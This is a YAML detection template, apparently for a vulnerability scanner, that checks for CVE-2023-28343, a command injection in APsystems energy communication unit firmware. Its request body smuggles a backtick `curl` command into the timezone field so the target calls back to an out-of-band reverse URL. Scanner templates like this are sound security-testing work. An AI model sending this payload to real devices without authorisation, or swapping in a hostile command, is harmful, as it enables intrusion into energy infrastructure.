name: yaml-poc-apsystems-energy_communication_unit_firmware-unauthorized_access-CVE-2023-28343
binding: 69533070-b42d-47af-8cd4-b4f1d68ea4b9
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171775/Altenergy-Power-Control-Software-C1.2.5-Command-Injection.html
        - https://apsystems.com
        - https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md
    vulnerability:
        id: 195c5cf8-3e29-4684-8c08-82bcab4569b9
        level: critical
    warning: Harmless
transport: http
set:
    host: request.url.host
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php/management/set_timezone
            headers:
                Content-Type: application/x-www-form-urlencoded
                Referer: http://{{host}}/index.php/management/datetime
                X-Requested-With: XMLHttpRequest
            body: timezone=`curl {{reverseUrl}}`
        expression: reverse.wait(3)
expression: r0()
